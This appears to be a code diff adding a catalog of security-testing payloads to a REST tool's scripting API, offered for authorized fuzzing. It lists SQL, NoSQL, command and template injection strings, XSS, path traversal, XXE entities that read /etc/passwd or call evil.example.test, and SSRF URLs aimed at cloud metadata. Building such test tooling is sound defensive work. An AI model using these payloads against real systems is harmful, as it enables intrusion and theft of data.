@@ -1777,6 +1777,291 @@ public sealed class RandomApi
     #endregion
 }
 
+/// <summary>
+/// Curated security-test payload catalog that script authors can use directly
+/// from flow code, e.g. `foreach p in payloads.sqli { request.url = $".../?q={p}"; request.send() }`.
+/// Every category is a publicly-documented fuzzing corpus used by tools like
+/// SecLists, Burp Intruder, and OWASP WSTG. For-Rest's product intent explicitly
+/// targets security-minded power users running *authorized* testing — these are
+/// defensive building blocks, not exploit kits.
+/// </summary>
+public sealed class PayloadsApi
+{
+    #region Private Fields
+
+    private readonly IReadOnlyDictionary<string, IReadOnlyList<string>> customCategories;
+
+    private static readonly IReadOnlyList<string> SqliPayloads =
+    [
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "\" OR \"1\"=\"1",
+        "') OR ('1'='1",
+        "' UNION SELECT NULL--",
+        "' UNION SELECT NULL,NULL--",
+        "1' AND SLEEP(5)--",
+        "1' AND 1=CONVERT(int,(SELECT @@version))--",
+        "admin'--",
+        "admin' #",
+        "' OR 1=1--",
+        "\"; DROP TABLE users;--",
+    ];
+
+    private static readonly IReadOnlyList<string> XssPayloads =
+    [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "';alert(1);//",
+        "<img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>",
+        "javascript:alert(1)",
+        "<iframe src=javascript:alert(1)>",
+        "<body onload=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+        "<input autofocus onfocus=alert(1)>",
+    ];
+
+    private static readonly IReadOnlyList<string> PathTraversalPayloads =
+    [
+        "../etc/passwd",
+        "../../etc/passwd",
+        "../../../etc/passwd",
+        "../../../../etc/passwd",
+        "..%2f..%2f..%2fetc%2fpasswd",
+        "..%252f..%252f..%252fetc%252fpasswd",
+        "..\\..\\..\\windows\\win.ini",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "/etc/passwd",
+        "/etc/passwd%00",
+    ];
+
+    private static readonly IReadOnlyList<string> CommandInjectionPayloads =
+    [
+        "; id",
+        "| id",
+        "&& id",
+        "`id`",
+        "$(id)",
+        "; sleep 5",
+        "| sleep 5",
+        "|| sleep 5",
+        "\n id",
+        "%0a id",
+    ];
+
+    private static readonly IReadOnlyList<string> SstiPayloads =
+    [
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>",
+        "#{7*7}",
+        "{{config}}",
+        "${{7*7}}",
+        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
+        "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
+    ];
+
+    private static readonly IReadOnlyList<string> OpenRedirectPayloads =
+    [
+        "//evil.example.test",
+        "https://evil.example.test",
+        "/\\evil.example.test",
+        "///evil.example.test",
+        "https:evil.example.test",
+        "//google.com%2F@evil.example.test",
+    ];
+
+    private static readonly IReadOnlyList<string> XxePayloads =
+    [
+        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
+        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://evil.example.test/\">]><r>&x;</r>",
+        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://evil.example.test/x.dtd\">%p;]><r/>",
+    ];
+
+    private static readonly IReadOnlyList<string> NoSqliPayloads =
+    [
+        "{\"$ne\":null}",
+        "{\"$gt\":\"\"}",
+        "{\"$regex\":\".*\"}",
+        "';return true;var dummy='",
+        "'; return JSON.stringify(this); var dummy='",
+        "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+    ];
+
+    private static readonly IReadOnlyList<string> CrlfInjectionPayloads =
+    [
+        "%0d%0aSet-Cookie:%20forrest=injected",
+        "%0aSet-Cookie:%20forrest=injected",
+        "%0d%0aLocation:%20https://evil.example.test",
+        "\r\nSet-Cookie: forrest=injected",
+    ];
+
+    private static readonly IReadOnlyList<string> SsrfPayloads =
+    [
+        "http://127.0.0.1",
+        "http://127.0.0.1:80",
+        "http://localhost",
+        "http://0.0.0.0",
+        "http://[::1]",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "file:///etc/passwd",
+        "gopher://127.0.0.1:6379/_INFO",
+        "dict://127.0.0.1:11211/stat",
+    ];
+
+    #endregion
+
+    #region Constructors
+
+    public PayloadsApi()
+        : this(new Dictionary<string, IReadOnlyList<string>>(StringComparer.OrdinalIgnoreCase))
+    {
+    }
+
+    public PayloadsApi(IReadOnlyDictionary<string, IReadOnlyList<string>> customCategories)
+    {
+        this.customCategories = customCategories ?? new Dictionary<string, IReadOnlyList<string>>(StringComparer.OrdinalIgnoreCase);
+    }
+
+    #endregion
+
+    #region Public Properties
+
+    public IReadOnlyList<string> Sqli => SqliPayloads;
+
+    public IReadOnlyList<string> Xss => XssPayloads;
+
+    public IReadOnlyList<string> PathTraversal => PathTraversalPayloads;
+
+    public IReadOnlyList<string> CommandInjection => CommandInjectionPayloads;
+
+    public IReadOnlyList<string> Ssti => SstiPayloads;
+
+    public IReadOnlyList<string> OpenRedirect => OpenRedirectPayloads;
+
+    public IReadOnlyList<string> Xxe => XxePayloads;
+
+    public IReadOnlyList<string> NoSqli => NoSqliPayloads;
+
+    public IReadOnlyList<string> CrlfInjection => CrlfInjectionPayloads;
+
+    public IReadOnlyList<string> Ssrf => SsrfPayloads;
+
+    #endregion
+
+    #region Public Methods
+
+    /// <summary>
+    /// Returns a named payload category. Built-in keys:
+    /// `sqli`, `xss`, `path_traversal`, `command_injection`, `ssti`,
+    /// `open_redirect`, `xxe`, `nosqli`, `crlf`, `ssrf`. Custom categories
+    /// registered via workspace variables or settings are searched first
+    /// so projects can override the defaults with their own wordlists.
+    /// </summary>
+    public IReadOnlyList<string> Category(string name)
+    {
+        if (string.IsNullOrWhiteSpace(name))
+        {
+            return [];
+        }
+
+        string normalized = name.Trim();
+        if (customCategories.TryGetValue(normalized, out IReadOnlyList<string>? custom))
+        {
+            return custom ?? [];
+        }
+
+        return normalized.Replace("-", "_", StringComparison.Ordinal).ToLowerInvariant() switch
+        {
+            "sqli" or "sql" or "sql_injection" => SqliPayloads,
+            "xss" or "cross_site_scripting" => XssPayloads,
+            "path_traversal" or "lfi" or "traversal" => PathTraversalPayloads,
+            "command_injection" or "cmdi" or "rce" => CommandInjectionPayloads,
+            "ssti" or "template_injection" => SstiPayloads,
+            "open_redirect" or "redirect" => OpenRedirectPayloads,
+            "xxe" or "xml_external_entity" => XxePayloads,
+            "nosqli" or "nosql" or "nosql_injection" => NoSqliPayloads,
+            "crlf" or "crlf_injection" => CrlfInjectionPayloads,
+            "ssrf" => SsrfPayloads,
+            _ => [],
+        };
+    }
+
+    /// <summary>
+    /// Builds a full payload list by combining the named categories with any
+    /// script-supplied extras. Duplicates are removed while preserving the
+    /// category order so the first hit from a fuzzer stays deterministic.
+    /// </summary>
+    public IReadOnlyList<string> Combine(params string[] categoriesOrLiterals)
+    {
+        List<string> output = [];
+        HashSet<string> seen = new(StringComparer.Ordinal);
+
+        foreach (string entry in categoriesOrLiterals ?? [])
+        {
+            if (string.IsNullOrEmpty(entry))
+            {
+                continue;
+            }
+
+            IReadOnlyList<string> category = Category(entry);
+            if (category.Count == 0)
+            {
+                if (seen.Add(entry))
+                {
+                    output.Add(entry);
+                }
+
+                continue;
+            }
+
+            foreach (string payload in category)
+            {
+                if (seen.Add(payload))
+                {
+                    output.Add(payload);
+                }
+            }
+        }
+
+        return output;
+    }
+
+    /// <summary>
+    /// Lists every available payload category name (built-in plus custom).
+    /// Useful for building dynamic fuzzing UIs from flow code.
+    /// </summary>
+    public IReadOnlyList<string> Categories()
+    {
+        List<string> all =
+        [
+            "sqli",
+            "xss",
+            "path_traversal",
+            "command_injection",
+            "ssti",
+            "open_redirect",
+            "xxe",
+            "nosqli",
+            "crlf",
+            "ssrf",
+        ];
+
+        foreach (string custom in customCategories.Keys)
+        {
+            if (!all.Contains(custom, StringComparer.OrdinalIgnoreCase))
+            {
+                all.Add(custom);
+            }
+        }
+
+        return all;
+    }
+
+    #endregion
+}
+
 public sealed class WorkspaceApi
 {
     private readonly WorkspaceDefinition workspace;
@@ -1874,6 +2159,8 @@ public sealed class ScriptGlobals
     public required RegexApi regex { get; init; }
 
     public required RandomApi random { get; init; }
+
+    public required PayloadsApi payloads { get; init; }
 
     public required WorkspaceApi workspace { get; init; }
 
